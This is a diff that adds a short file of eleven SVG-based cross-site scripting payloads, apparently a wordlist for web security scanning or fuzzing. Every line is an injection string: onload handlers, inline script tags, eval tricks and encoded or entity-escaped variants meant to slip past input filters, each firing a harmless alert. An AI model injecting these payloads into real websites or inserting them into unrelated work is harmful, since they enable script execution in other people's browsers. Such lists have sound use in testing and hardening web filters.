@@ -1,0 +1,11 @@
+<svg/onload=alert('XSS')>
+<svgonload=alert(1)>
+<svg><script>alert('33')
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg onload=alert(1)//
+<svg id=alert(1) onload=eval(id)>
+<svg><script>alert('XSS')
+<svg><script>alert&lpar;'33'&rpar;
+<svg><script href=data:,alert(1) />
